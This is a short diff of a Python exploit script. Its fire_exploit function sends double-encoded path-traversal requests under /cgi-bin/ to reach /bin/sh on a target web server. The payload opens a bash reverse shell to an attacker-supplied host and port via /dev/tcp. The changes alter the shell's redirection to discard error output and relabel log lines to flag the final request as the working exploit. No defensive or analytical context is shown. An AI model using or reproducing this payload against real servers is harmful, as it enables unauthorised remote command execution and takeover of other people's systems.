@@ -88,7 +88,7 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
 
     payload = (
         f"echo Content-Type: text/plain; echo; "
-        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+        f"/bin/bash -c '/bin/bash -i > /dev/tcp/{lhost}/{lport} 2>/dev/null 0>&1'"
     )
     working_path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
 
@@ -103,9 +103,9 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
     last = len(attempts) - 1
     for i, (method, path, body, note) in enumerate(attempts):
         if i == last:
-            log(f"[*] Sending exploit to {host}:{port}{path}")
+            log(f"$ {method} http://{host}:{port}{path}  (working exploit → shell on {lhost}:{lport})")
         else:
-            log(f"[*] Trying {method} {path} ({note})")
+            log(f"$ {method} http://{host}:{port}{path}  ({note})")
         _send_request(host, port, _build_request(method, host, path, body))
         if attempt_delay and i != last:
             time.sleep(attempt_delay)
